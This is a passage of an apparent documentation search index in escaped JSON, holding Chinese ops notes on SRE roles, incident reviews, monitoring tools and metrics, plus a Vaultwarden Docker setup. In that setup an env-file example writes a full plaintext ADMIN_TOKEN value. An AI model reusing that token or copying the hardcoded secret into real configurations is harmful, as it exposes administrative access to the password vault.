<p>\u5e73\u5e38\u5fc3\u770b\u5f85\u6545\u969c\uff0c\u8fa9\u8bc1\u7684\u770b\u5f85\u6545\u969c\uff0c\u9f13\u52b1\u6539\u8fdb\uff0c\u800c\u4e0d\u662f\u5904\u7f5a\u9519\u8bef\u3002</p>"},{"location":"ops/50-sre-mogu/#24","title":"2.4 \u7ec4\u7ec7\u67b6\u6784","text":"<p>\u7ec4\u7ec7\u67b6\u6784\u8981\u4e0e\u6280\u672f\u67b6\u6784\u76f8\u5339\u914d\u3002</p> <p>SRE\u662f\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u67b6\u6784\u7684\u4ea7\u7269\u3002</p> <p>\u4e91\u539f\u751f\u56db\u8981\u7d20</p> <ol> <li>\u5fae\u670d\u52a1</li> <li>\u5bb9\u5668</li> <li>DevOps/SRE</li> <li>\u6301\u7eed\u4ea4\u4ed8</li> </ol> <p>\u89d2\u8272</p> <ul> <li> <p>PE - Production Engineer</p> </li> <li> <p>\u5de5\u5177\u5e73\u53f0\u5f00\u53d1</p> </li> <li> <p>\u7a33\u5b9a\u6027\u5e73\u53f0\u5f00\u53d1</p> </li> </ul>"},{"location":"ops/50-sre-mogu/#_3","title":"\u4e09\u3001\u4f5c\u8005\u539f\u8bb2","text":"<p>\u68b3\u7406\u7b14\u8bb0</p> <p>01\uff5cSRE\u8ff7\u601d\uff1a\u65e0\u6240\u4e0d\u80fd\u7684\u89d2\u8272\uff1f\u8fd8\u662f\u8fd0\u7ef4\u7684\u5347\u7ea7\uff1f</p> <p>02 | \u7cfb\u7edf\u53ef\u7528\u6027\uff1a\u6ca1\u6709\u6545\u969c\uff0c\u7cfb\u7edf\u5c31\u4e00\u5b9a\u662f\u7a33\u5b9a\u7684\u5417\uff1f</p> <p>03 | SRE\u5207\u5165\u70b9\uff1a\u9009\u62e9SLI\uff0c\u8bbe\u5b9aSLO</p> <p>04 | \u9519\u8bef\u9884\u7b97\uff1a\u8fbe\u6210\u7a33\u5b9a\u6027\u76ee\u6807\u7684\u5171\u8bc6\u673a\u5236</p> <p>05 | \u6848\u4f8b\uff1a\u843d\u5730SLO\u65f6\u8fd8\u9700\u8981\u8003\u8651\u54ea\u4e9b\u56e0\u7d20\uff1f</p> <p>06 | \u6545\u969c\u53d1\u73b0\uff1a\u5982\u4f55\u5efa\u8bbeOn-Call\u673a\u5236\uff1f</p> <p>07\uff5c\u6545\u969c\u5904\u7406\uff1a\u4e00\u5207\u4ee5\u6062\u590d\u4e1a\u52a1\u4e3a\u6700\u9ad8\u4f18\u5148\u7ea7</p> <p>08\uff5c\u6545\u969c\u590d\u76d8\uff1a\u9ec4\u91d1\u4e09\u95ee\u4e0e\u5224\u5b9a\u4e09\u539f\u5219</p> <p>09\uff5c\u6848\u4f8b\uff1a\u4e92\u8054\u7f51\u5178\u578b\u7684SRE\u7ec4\u7ec7\u67b6\u6784\u662f\u600e\u6837\u7684\uff1f</p> <p>10 | \u7ecf\u9a8c\uff1a\u90fd\u6709\u54ea\u4e9b\u9ad8\u6548\u7684SRE\u7ec4\u7ec7\u534f\u4f5c\u673a\u5236\uff1f</p>"},{"location":"ops/51-sre-didi/","title":"\u7a33\u5b9a\u6027\u601d\u8003","text":"<p>\u6e90\u81ea\u4e8e\u6ef4\u6ef4\u5206\u4eab</p> <p>Reference</p>"},{"location":"ops/51-sre-didi/#_2","title":"\u4e00\u3001\u7b14\u8bb0\u6574\u7406","text":"<p>\u68b3\u7406\u7b14\u8bb0</p>"},{"location":"ops/51-sre-didi/#_3","title":"\u4e8c\u3001\u5173\u952e\u5185\u5bb9","text":""},{"location":"ops/51-sre-didi/#21","title":"2.1 \u6545\u969c\u5206\u7c7b","text":""},{"location":"ops/51-sre-didi/#22","title":"2.2 \u6709\u6548\u9884\u9632","text":"<ul> <li>\u8ba1\u5212\u5185\u53d8\u5316</li> <li>\u8ba1\u5212\u5916\u53d8\u5316</li> </ul>"},{"location":"ops/51-sre-didi/#23","title":"2.3 \u53d1\u73b0\u95ee\u9898","text":"<ul> <li>Logging</li> <li>Tracing</li> <li>Metrics</li> </ul> <p>\u533a\u5206\u7a33\u5b9a\u6027\u3001\u544a\u8b66\u3001\u901a\u77e5\u3001\u4e8b\u4ef6</p> <p>\u544a\u8b66\u5185\u5bb9\u662f\u5177\u6709\u6307\u5bfc\u610f\u4e49\u7684</p> <ul> <li>\u544a\u8b66\u8bef\u62a5\uff0c\u8bef\u62a5\u4f1a\u9020\u6210\u72fc\u6765\u4e86\u6548\u5e94</li> <li> <p>\u544a\u8b66\u592a\u591a\uff0c\u6d77\u91cf\u6d88\u606f\u7b49\u4e8e\u6ca1\u6709\u6d88\u606f</p> </li> <li> <p>\u786e\u4fdd\u53ef\u8fbe\uff0c\u89e6\u8fbe\u5230oncall\u4eba\u5458</p> </li> </ul>"},{"location":"ops/51-sre-didi/#24","title":"2.4 \u5b9a\u4f4d","text":"<p>\u706d\u706b\u56fe</p> <p></p> <p>\u5bfb\u56e0</p> <p></p> <p>\u4e8b\u4ef6\u5e8f\u5217</p> <p></p>"},{"location":"ops/51-sre-didi/#25","title":"2.5 \u6b62\u635f","text":""},{"location":"ops/51-sre-didi/#26","title":"2.6 \u590d\u76d8","text":"<p>\u9996\u5148\u6211\u4eec\u601d\u8003\u4e0b\uff0c\u4e3a\u4ec0\u4e48\u8981\u590d\u76d8\uff0c\u6211\u7406\u89e3\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u70b9</p> <ul> <li>\u63d0\u5347\u4e1a\u52a1\u7a0b\u5e8f\u7684\u5065\u58ee\u6027</li> <li>\u4f18\u5316\u5e94\u6025\u54cd\u5e94\u6d41\u7a0b</li> <li>\u53d1\u6325\u8b66\u793a\u4f5c\u7528\uff0c\u8bb0\u5f55\u4e3a\u77e5\u8bc6\u5e93\uff0c\u5b9a\u671f\u56de\u987e</li> <li>\u4ee5\u590d\u76d8\u4e3a\u5951\u673a\uff0c\u63d0\u9ad8\u4e1a\u52a1\u5bf9\u7a33\u5b9a\u6027\u7684\u91cd\u89c6\u7a0b\u5ea6</li> </ul> <p>\u57fa\u4e8e\u4e0a\u9762\u590d\u76d8\u7684\u76ee\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u6574\u7406\u51fa\u4e0b\u9762\u7684\u590d\u76d8\u6a21\u677f</p> <ul> <li>\u6574\u7406\u6545\u969c\u53d1\u751f\u5230\u7ed3\u675f\u7684\u6574\u4e2a\u65f6\u95f4\u7ebf\u4e0a\u53d1\u751f\u7684\u4e8b\u60c5</li> <li>\u8bb0\u5f55\u4ece\u6545\u969c\u53d1\u751f\u5230\u53d1\u73b0\u3001\u4ece\u53d1\u73b0\u5230\u5b9a\u4f4d\u3001\u4ece\u5b9a\u4f4d\u5230\u6b62\u635f\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u601d\u8003\u5982\u4f55\u51cf\u5c11\u8fd9\u4e9b\u65f6\u95f4</li> <li>\u8bb0\u5f55\u5bfc\u81f4\u6545\u969c\u7684\u539f\u56e0\u662f\u4ec0\u4e48\uff0c\u6839\u56e0\u662f\u4ec0\u4e48</li> <li>\u601d\u8003\u540e\u7eed\u5982\u4f55\u907f\u514d\u7c7b\u4f3c\u7684\u95ee\u9898</li> <li>\u601d\u8003\u5904\u7406\u6d41\u7a0b\u6709\u54ea\u4e9b\u4f18\u5316\u7684\u5730\u65b9</li> <li>\u601d\u8003\u8f85\u52a9\u5e73\u53f0\u6709\u54ea\u4e9b\u53ef\u4ee5\u4f18\u5316\u7684\u5730\u65b9</li> <li>\u8f93\u51fa\u540e\u7eed\u6574\u6539\u8ba1\u5212\uff0c\u8bb0\u5f55\u5230\u516c\u53f8\u5185\u90e8\u7684 todo \u7ba1\u7406\u5e73\u53f0\uff0c\u8ddf\u8e2a\u5b8c\u6210\u60c5\u51b5</li> </ul>"},{"location":"ops/60-monitor/","title":"\u5efa\u8bbe\u76d1\u63a7","text":""},{"location":"ops/60-monitor/#_2","title":"\u4e00\u3001\u76d1\u63a7\u76ee\u6807","text":"<p>\u660e\u767d\u76d1\u63a7\u7684\u91cd\u8981\u6027\u4ee5\u53ca\u4f7f\u7528\u76d1\u63a7\u8981\u5b9e\u73b0\u7684\u4e1a\u52a1\u76ee\u6807</p> <p>\u901a\u5e38\u5305\u62ec\u4ee5\u4e0b\u4e09\u70b9\uff1a</p> <ul> <li>\u5bf9\u76ee\u6807\u7cfb\u7edf\u8fdb\u884c\u5b9e\u65f6\u76d1\u63a7</li> <li>\u76d1\u63a7\u53ef\u4ee5\u5b9e\u65f6\u53cd\u9988\u76ee\u6807\u7cfb\u7edf\u7684\u5f53\u524d\u72b6\u6001 \u76ee\u6807\u7cfb\u7edf\u786c\u4ef6\u3001\u8f6f\u4ef6\u3001\u4e1a\u52a1\u662f\u5426\u6b63\u5e38\u3001\u76ee\u524d\u5904\u4e8e\u4f55\u79cd\u72b6\u6001</li> <li>\u4fdd\u8bc1\u76ee\u6807\u7cfb\u7edf\u53ef\u9760\u6027\uff0c\u4e1a\u52a1\u53ef\u4ee5\u6301\u7eed\u7a33\u5b9a\u8fd0\u884c \u6709\u95ee\u9898\u65f6\u95f4\u53cd\u9988\u51fa\u6765\uff0c\u4fbf\u4e8e\u8fd0\u7ef4\u4eba\u5458\u5904\u7406</li> </ul>"},{"location":"ops/60-monitor/#_3","title":"\u4e8c\u3001\u76d1\u63a7\u65b9\u6cd5","text":"<ul> <li>\u4e86\u89e3\u76d1\u63a7\u5bf9\u8c61 \u4f8b\u5982\uff1aCPU\u5982\u4f55\u5de5\u4f5c\uff1f</li> <li>\u6027\u80fd\u57fa\u51c6\u6307\u6807 \u4f8b\u5982: CPU\u4f7f\u7528\u7387\u3001\u8d1f\u8f7d\u3001\u7528\u6237\u6001\u3001\u5185\u6838\u6001\u3001\u4e0a\u4e0b\u6587\u5207\u6362</li> <li>\u62a5\u8b66\u9608\u503c\u5b9a\u4e49 \u4f8b\u5982: CPU\u8d1f\u8f7d\u9ad8\u7684\u5b9a\u4e49\uff0c\u5185\u6838\u6001\u3001\u7528\u6237\u6001\u591a\u5c11\u7b97\u9ad8</li> <li>\u6545\u969c\u5904\u7406\u6d41\u7a0b \u5982\u4f55\u66f4\u9ad8\u6548\u5904\u7406\u6545\u969c\u7684\u6d41\u7a0b</li> </ul>"},{"location":"ops/60-monitor/#_4","title":"\u4e09\u3001\u76d1\u63a7\u6838\u5fc3","text":"<ul> <li>\u53d1\u73b0\u95ee\u9898</li> <li>\u5b9a\u4f4d\u95ee\u9898</li> <li>\u89e3\u51b3\u95ee\u9898</li> <li>\u603b\u7ed3\u95ee\u9898\uff0c\u5bf9\u6545\u969c\u539f\u56e0\u53ca\u95ee\u9898\u9632\u8303\u8fdb\u884c\u5f52\u7eb3\u603b\u7ed3\uff0c\u907f\u514d\u4ee5\u540e\u91cd\u590d\u51fa\u73b0</li> </ul>"},{"location":"ops/60-monitor/#_5","title":"\u56db\u3001\u76d1\u63a7\u5de5\u5177","text":"<ul> <li> <p>\u8001\u724c\u76d1\u63a7</p> </li> <li> <ul> <li>Cacti</li> </ul> </li> <li>Nagios</li> <li> <p>smokeping</p> </li> <li> <p>\u6d41\u884c\u76d1\u63a7</p> </li> <li> <ul> <li>Zabbix</li> </ul> </li> <li>OpenFalcon</li> <li>Prometheus+Grafana</li> <li>\u6ef4\u6ef4\u5f00\u6e90\u591c\u83baNightingale</li> <li>smartping(\u4e13\u7528\u4e8e\u7f51\u7edc\u76d1\u63a7)</li> <li>LEPUS\u5929\u5154(\u4e13\u7528\u4e8e\u76d1\u63a7\u6570\u636e\u5e93)</li> <li> <p>\u81ea\u7814</p> </li> <li> <p>\u7b2c\u4e09\u65b9\u76d1\u63a7</p> </li> <li> <ul> <li>\u76d1\u63a7\u5b9d</li> </ul> </li> <li>\u542c\u4e91</li> <li>newrelic</li> </ul>"},{"location":"ops/60-monitor/#_6","title":"\u4e94\u3001\u76d1\u63a7\u6d41\u7a0b","text":"<ul> <li>\u91c7\u96c6</li> </ul> <p>\u901a\u8fc7SNMP\u3001Agent\u3001ICMP\u3001SSH\u3001IPMI\u7b49\u5bf9\u7cfb\u7edf\u8fdb\u884c\u6570\u636e\u91c7\u96c6</p> <ul> <li>\u5b58\u50a8</li> </ul> <p>\u5404\u7c7b\u6570\u636e\u5e93\u670d\u52a1\uff0cMySQL\u3001PostgreSQL</p> <ul> <li>\u5206\u6790</li> </ul> <p>\u63d0\u4f9b\u56fe\u5f62\u53ca\u65f6\u95f4\u7ebf\u60c5\u51b5\u4fe1\u606f\uff0c\u65b9\u4fbf\u6211\u4eec\u5b9a\u4f4d\u6545\u969c\u6240\u5728</p> <ul> <li>\u5c55\u793a</li> </ul> <p>\u6307\u6807\u4fe1\u606f\u3001\u6307\u6807\u8d8b\u52bf\u5c55\u793a</p> <ul> <li>\u62a5\u8b66</li> </ul> <p>\u7535\u8bdd\u3001\u90ae\u4ef6\u3001\u5fae\u4fe1\u3001\u77ed\u4fe1\u3001\u62a5\u8b66\u5347\u7ea7\u673a\u5236</p> <ul> <li>\u5904\u7406</li> </ul> <p>\u6545\u969c\u7ea7\u522b\u5224\u5b9a\uff0c\u627e\u54cd\u5e94\u4eba\u5458\u8fdb\u884c\u5feb\u901f\u5904\u7406</p>"},{"location":"ops/60-monitor/#_7","title":"\u516d\u3001\u76d1\u63a7\u6307\u6807","text":""},{"location":"ops/60-monitor/#_8","title":"\u786c\u4ef6\u76d1\u63a7","text":"<ul> <li>\u673a\u5668\u786c\u4ef6:CPU\u6e29\u5ea6\u3001\u7269\u7406\u78c1\u76d8\u3001\u865a\u62df\u78c1\u76d8\u3001\u4e3b\u677f\u6e29\u5ea6\u3001\u78c1\u76d8\u9635\u5217   IPMI\u5de5\u5177\u65e0\u6cd5\u83b7\u53d6\u5230\u786c\u4ef6\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u501f\u52a9MegaCli\u5de5\u5177\u63a2\u6d4bRaid\u78c1\u76d8\u961f\u5217\u72b6\u6001   https://www.ibm.com/developerworks/cn/linux/l-ipmi/</li> </ul>"},{"location":"ops/60-monitor/#_9","title":"\u7cfb\u7edf\u76d1\u63a7","text":"<ul> <li>\u4e3b\u673a\u5b58\u6d3b</li> <li>CPU\u3001\u5185\u5b58\u3001\u786c\u76d8\u3001\u4f7f\u7528\u7387</li> <li>inode</li> <li>\u8d1f\u8f7d</li> <li>\u7f51\u5361\u51fa\u5165\u5e26\u5bbd</li> <li>TCP\u8fde\u63a5\u6570</li> <li>\u78c1\u76d8\u8bfb\u5199\u3001\u53ea\u8bfb</li> </ul>"},{"location":"ops/60-monitor/#_10","title":"\u5e94\u7528\u76d1\u63a7","text":"<p>MySQL</p> <ul> <li>\u670d\u52a1\u53ef\u7528\u6027</li> <li>\u5185\u5b58\u4f7f\u7528\u7387</li> <li>\u78c1\u76d8\u4f7f\u7528</li> <li>\u4e3b\u4ece\u4e0d\u540c\u6b65\u53ca\u5ef6\u8fdf</li> <li>\u5907\u4efd\u60c5\u51b5</li> <li>\u8fde\u63a5\u6570</li> </ul> <p>Redis\u3001Redis Cluster</p> <ul> <li>\u8d1f\u8f7d</li> <li>\u5185\u5b58\u4f7f\u7528\u7387</li> <li>\u8fde\u63a5\u6570\u91cf</li> <li>qps</li> </ul> <p>Nginx</p> <ul> <li> <p>\u72b6\u6001\u7801</p> </li> <li> <p>\u8fde\u63a5\u72b6\u6001\u4fe1\u606f</p> </li> <li> <p>RabbitMQ</p> </li> <li> <p>PHP-FPM</p> </li> <li> <p>OpenLDAP</p> </li> <li> <ul> <li>\u63a5\u5165IP</li> </ul> </li> <li> <p>\u8c03\u7528\u6b21\u6570</p> </li> <li> <p>Zimbra</p> </li> <li> <p>OpenVPN</p> </li> <li> <ul> <li>\u7248\u672c\u4fe1\u606f\u3001\u5f53\u524d\u5728\u7ebf</li> </ul> </li> <li> <p>\u7528\u6237\u3001\u5206\u914dIP\u3001\u5ba2\u6237\u7aef\u8fde\u63a5IP\u3001\u901a\u8fc7IP\u83b7\u53d6\u5730\u5740\u4f4d\u7f6e\u3001\u63a5\u6536\u53d1\u9001\u6d41\u91cf \u8fde\u63a5\u65f6\u95f4 \u65f6\u957f \u8fde\u63a5ID</p> </li> <li> <p>ELK</p> </li> <li> <p>Graylog</p> </li> <li> <p>GitLab</p> </li> <li> <p>Jenkins</p> </li> <li> <p>MongoDB</p> </li> <li> <p>HAproxy</p> </li> </ul>"},{"location":"ops/60-monitor/#_11","title":"\u7f51\u7edc\u76d1\u63a7","text":"<ul> <li>\u7f51\u7edc\u8d28\u91cf</li> <li>\u516c\u7f51\u51fa\u53e3</li> <li>\u4e13\u7ebf\u5e26\u5bbd</li> <li>\u7f51\u7edc\u8bbe\u5907</li> </ul>"},{"location":"ops/60-monitor/#_12","title":"\u6d41\u91cf\u5206\u6790","text":""},{"location":"ops/60-monitor/#_13","title":"\u65e5\u5fd7\u76d1\u63a7","text":""},{"location":"ops/60-monitor/#_14","title":"\u5b89\u5168\u76d1\u63a7","text":"<ul> <li>URL\u3001API\u76d1\u63a7</li> <li>\u81ea\u7814</li> <li>\u963f\u91cc\u4e91\u65b9\u6848</li> </ul>"},{"location":"ops/60-monitor/#apmjavaphpgonodejs","title":"\u6027\u80fd\u76d1\u63a7(APM)java|php|go|nodejs|\u5206\u5e03\u5f0f\u94fe\u8def\u8ffd\u8e2a","text":"<ul> <li>PinPoint</li> <li>Zipkin</li> <li>SkyWalking</li> <li>CAT\u3001Jaeger</li> </ul>"},{"location":"ops/60-monitor/#_15","title":"\u4e1a\u52a1\u76d1\u63a7","text":"<p>\u7535\u5546\u4e1a\u52a1\u4e3a\u4f8b\uff1a</p> <ul> <li>\u6bcf\u5206\u949f\u4ea7\u751f\u591a\u5c11\u8ba2\u5355</li> <li>\u6bcf\u5206\u949f\u6ce8\u518c\u591a\u5c11\u7528\u6237</li> <li>\u6bcf\u5206\u949f\u591a\u5c11\u6d3b\u8dc3\u7528\u6237</li> <li>\u6bcf\u5929\u6709\u591a\u5c11\u63a8\u5e7f\u6d3b\u52a8</li> <li>\u63a8\u5e7f\u6d3b\u52a8\u5f15\u5165\u591a\u5c11\u7528\u6237</li> <li>\u63a8\u5e7f\u6d3b\u52a8\u5f15\u5165\u591a\u5c11\u6d41\u91cf</li> <li>\u63a8\u5e7f\u6d3b\u52a8\u5f15\u5165\u591a\u5c11\u5229\u6da6</li> </ul>"},{"location":"ops/60-monitor/#_16","title":"\u5176\u4ed6","text":"<ul> <li>SSL\u8bc1\u4e66\u76d1\u63a7</li> <li>\u5b58\u6d3b\u6027 \u8fdb\u7a0b\u662f\u5426\u8fd8\u5728\uff0c\u7aef\u53e3\u76d1\u542c\u3001Log\u6eda\u52a8</li> <li>\u5065\u5eb7\u6307\u6807 MQ\u6d88\u606f\u5806\u79ef\u91cf</li> <li>\u63a5\u53e3\u76d1\u63a7 API\u6210\u529f\u7387\uff0c\u5ef6\u8fdf\u60c5\u51b5\uff0cQPS\u7b49\u7b49</li> </ul>"},{"location":"ops/60-monitor/#_17","title":"\u4e03\u3001\u76d1\u63a7\u62a5\u8b66","text":"<ul> <li>\u90ae\u4ef6</li> <li>\u77ed\u4fe1</li> <li>\u9489\u9489\u3001\u5fae\u4fe1\u3001\u4f01\u4e1a\u5fae\u4fe1\u7b49\u5176\u4ed6\u5373\u65f6\u901a\u4fe1\u8f6f\u4ef6</li> <li>\u7535\u8bdd</li> </ul>"},{"location":"ops/60-monitor/#_18","title":"\u516b\u3001\u62a5\u8b66\u5904\u7406","text":"<p>\u6545\u969c\u81ea\u6108: \u670d\u52a1\u5668\u5b95\u673a\u81ea\u52a8\u542f\u52a8\u3002\u5229\u7528\u8f6f\u4ef6\u673a\u5236supervisor\uff0csystemd\u6216\u8005\u81ea\u5b9a\u4e49\u811a\u672c\u5b9e\u73b0</p>"},{"location":"ops/60-monitor/#_19","title":"\u4e5d\u3001\u7efc\u5408\u76d1\u63a7","text":""},{"location":"ops/60-monitor/#_20","title":"\u786c\u4ef6\u76d1\u63a7","text":"<p>\u901a\u8fc7SNMP\u6765\u8fdb\u884c\u8def\u7531\u5668\u4ea4\u6362\u673a\u7684\u76d1\u63a7\u3001\u5176\u4ed6\u5185\u5bb9\u4f7f\u7528IPMI\u5b9e\u73b0\u3002\u5982\u679c\u90fd\u662f\u516c\u6709\u4e91\uff0c\u53ef\u4ee5\u5ffd\u7565\u8fd9\u90e8\u5206\u5185\u5bb9\u3002\u6848\u4f8b:Open-Falcon\u76d1\u63a7H3C-ER3260G2\u8def\u7531\u5668</p>"},{"location":"ops/60-monitor/#_21","title":"\u7cfb\u7edf\u76d1\u63a7","text":""},{"location":"ops/60-monitor/#_22","title":"\u670d\u52a1\u76d1\u63a7","text":"<ul> <li> <p>\u670d\u52a1\u81ea\u5e26</p> </li> <li> <ul> <li>Nginx\u81ea\u5e26status\u6a21\u5757</li> </ul> </li> <li>PHP\u76f8\u5e94status\u6a21\u5757</li> <li> <p>MySQL\u5229\u7528percona\u5b98\u65b9\u5de5\u5177\u8fdb\u884c\u76d1\u63a7</p> </li> <li> <p>\u901a\u8fc7\u81ea\u5b9a\u4e49\u65b9\u6cd5\u83b7\u53d6\u6570\u636e</p> </li> <li> <ul> <li>MySQL show global status xxx;</li> </ul> </li> <li> <p>Redis info\u6307\u4ee4\u4fe1\u606f</p> </li> <li> <p>\u7f51\u7edc\u76d1\u63a7(\u6df7\u5408\u4e91\u67b6\u6784)</p> </li> <li> <ul> <li>smokeping</li> </ul> </li> <li> <p>smartping</p> </li> <li> <p>\u5b89\u5168\u76d1\u63a7</p> </li> <li> <ul> <li>\u4e91\u670d\u52a1\u76f4\u63a5\u7528\u4e91\u5b89\u5168\u7ec4\u5373\u53ef\uff0c\u6216\u8005\u8865\u5145\u672c\u673aiptables</li> </ul> </li> <li>\u786c\u4ef6\u9632\u706b\u5899</li> <li> <p>Web\u670d\u52a1\u4f7f\u7528Nginx+Lua\u5b9e\u73b0Web\u5c42\u9762\u7684\u9632\u706b\u5899\uff0c\u6216\u8005Openresty</p> </li> <li> <p>\u65e5\u5fd7\u76d1\u63a7   ELK\u3001Graylog\u5b9e\u73b0\u5f02\u5e38\u65e5\u5fd7\uff0c\u9519\u8bef\u65e5\u5fd7\u5173\u952e\u5b57\u7684\u76d1\u63a7</p> </li> <li> <p>\u4e1a\u52a1\u76d1\u63a7   \u786e\u5b9a\u76d1\u63a7\u6307\u6807\uff0c\u76d1\u63a7\u8d77\u6765\uff0c\u4e1a\u52a1\u4e0d\u540c\u5404\u4e0d\u76f8\u540c</p> </li> <li> <p>\u6d41\u91cf\u5206\u6790   \u5efa\u8bae\u4f7f\u7528\u767e\u5ea6\u7edf\u8ba1\uff0cgoogle\u7edf\u8ba1\uff0c\u5546\u4e1a\uff0c\u7814\u53d1\u5d4c\u5165\u4ee3\u7801\u5b9e\u73b0\u3002</p> </li> </ul> <p>\u6216\u8005\u4f7f\u7528piwik</p> <ul> <li> <p>\u53ef\u89c6\u5316   dashboard</p> </li> <li> <p>\u81ea\u52a8\u5316\u76d1\u63a7   \u901a\u8fc7API\uff0c\u6279\u91cf\u64cd\u4f5c</p> </li> </ul>"},{"location":"ops/60-monitor/#_23","title":"\u5341\u3001\u76d1\u63a7\u603b\u7ed3","text":"<p>\u5b8c\u6574\u7684\u76d1\u63a7\u7cfb\u7edf\uff0c\u9700\u8981\u5bf9\u4e1a\u52a1\u6709\u8be6\u5c3d\u7684\u4e86\u89e3\uff0c\u8f6f\u4ef6\u53ea\u662f\u624b\u6bb5\u3002</p>"},{"location":"ops/70-pam/","title":"PAM","text":"<p>Reference</p>"},{"location":"ops/70-pam/#_1","title":"\u4e00\u3001\u5b89\u88c5","text":"<pre><code>Bitwarden\n\n\nVaultwarden\n\n# Reference\nhttps://github.com/dani-garcia/vaultwarden\nhttps://hub.docker.com/r/vaultwarden/server\nhttps://github.com/dani-garcia/vaultwarden/wiki\nhttps://bitwarden.com/download/\n\n# Sample\ndocker pull vaultwarden/server:latest\ndocker run -d --name vaultwarden -v ./vw-data/:/data/ --restart unless-stopped -p 8087:80 vaultwarden/server:latest\n\n# Explain\ndocker pull vaultwarden/server:1.32.7\ndocker run -d --name vaultwarden --restart unless-stopped \\\n  -v ./vaultwarden/:/data/ \\\n  -p 18080:80 \\\n  -e SIGNUPS_ALLOWED=false \\#\u7981\u7528\u65b0\u7528\u6237\u6ce8\u518c\n  -e INVITATIONS_ALLOWED=false \\#\u7981\u7528\u9080\u8bf7\n  -e ADMIN_TOKEN=xx \\#openssl rand -base64 48\n  vaultwarden/server:1.32.7\n\n# ENVS\nhttps://github.com/dani-garcia/vaultwarden/blob/main/.env.template\n\n# Example\ncat &gt; .vaultwarden.env &lt;&lt;EOF\n# signups disable \nSIGNUPS_ALLOWED=false\n\n# invitations disable \nINVITATIONS_ALLOWED=false\n\n# admin enable\uff08TOKEN\u4e0d\u80fd\u52a0\u5f15\u53f7\uff0c\u5426\u5219\u754c\u9762\u8f93\u5165\u540e\u8bc6\u522b\u4e0d\u51fa\u6765\uff09\nADMIN_TOKEN=Dxn0bNfpSbTF2BVR7rwsn92rfV5lxtocnfiesVAQICHRWLR1tXE0rzU0Q28Xe626\n\n# enable events logging\nORG_EVENTS_ENABLED=true\nEOF\n\ntouch .vaultwarden.env\ndocker run -d --name vaultwarden --restart unless-stopped \\\n  -v /data1/lib/vw-data/:/data/ \\\n  -p 18080:80 \\\n  --env-file=.vaultwarden.env \\\n  vaultwarden/server:1.32.7\n\n# Detect\ndocker top vaultwarden\ndocker logs -f vaultwarden\n\n# Reset\ndocker stop vaultwarden\ndocker rm vaultwarden\n</code></pre>"},{"location":"ops/70-pam/#_2","title":"\u4e8c\u3001\u4f7f\u7528","text":""},{"location":"ops/70-pam/#21","title":"2.1 \u63d2\u4ef6","text":"<p><code>chrome://extensions/</code></p> <p>\u63d2\u4ef6\u540d\u79f0\uff1aBitwarden</p>"},{"location":"ops/70-pam/#22-smtp","title":"2.2 SMTP","text":"<pre><code># Reverse Proxy, enable ssl &lt;required&gt;\nhttps://valutwanden.8ops.top/admin\n\n# settings\nSMTP_HOST=smtp.exmail.qq.com\nSMTP_FROM=vaultwarden@8ops.top\nSMTP_FROM_NAME=Vaultwarden\nSMTP_USERNAME=vaultwarden@8ops.top\nSMTP_PASSWORD=xx\nSMTP_TIMEOUT=15\nSMTP_SECURITY=force_tls\nSMTP_PORT=465\n</code></pre>"},{"location":"ops/70-pam/#todo","title":"!! TODO","text":"<pre><code>1\uff0c\u666e\u901a\u4f7f\u7528\n2\uff0c\u63d2\u4ef6\u4f7f\u7528\uff1aVaultwarden Chrome extents: Bitwarden\n3\uff0cSSO\u767b\u5f55\n4\uff0c\u914d\u7f6e\u90ae\u7bb1\n5\uff0c\u6ce8\u518c\u8d26\u53f7\n</code></pre>"}]}